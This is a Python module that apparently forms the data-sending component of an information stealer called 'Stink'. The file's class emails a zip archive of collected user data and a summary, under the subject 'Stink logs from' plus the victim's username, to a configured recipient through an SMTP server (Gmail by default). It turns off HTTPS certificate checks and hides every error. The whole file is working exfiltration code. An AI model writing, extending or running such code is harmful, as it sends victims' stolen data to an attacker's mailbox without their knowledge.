from io import BytesIO
from smtplib import SMTP
from getpass import getuser
from email.message import EmailMessage, Message

from helper.abstract import AbstractSender


class Smtp(AbstractSender):
    """
    Sender for the Email.
    """
    def __init__(self, sender_email: str, sender_password: str, recipient_email: str, smtp_server: str = "smtp.gmail.com", smtp_port: int = 587):
        super().__init__()

        self.__sender_email = sender_email
        self.__sender_password = sender_password
        self.__recipient_email = recipient_email

        self.__smtp_server = smtp_server
        self.__smtp_port = smtp_port

    def __get_sender_data(self) -> Message:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and server route.
        """
        message = EmailMessage()
        message["From"] = self.__sender_email
        message["To"] = self.__recipient_email
        message["Subject"] = f"Stink logs from {getuser()}"

        message.set_content(self.__preview)
        message.add_attachment(
            self.__data.getvalue(), maintype="application", subtype="octet-stream", filename=rf"{self.__zip_name}.zip"
        )

        return message

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        message = self.__get_sender_data()
        server = SMTP(self.__smtp_server, self.__smtp_port)

        server.starttls()
        server.login(self.__sender_email, self.__sender_password)
        server.send_message(message)
        server.quit()

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            pass
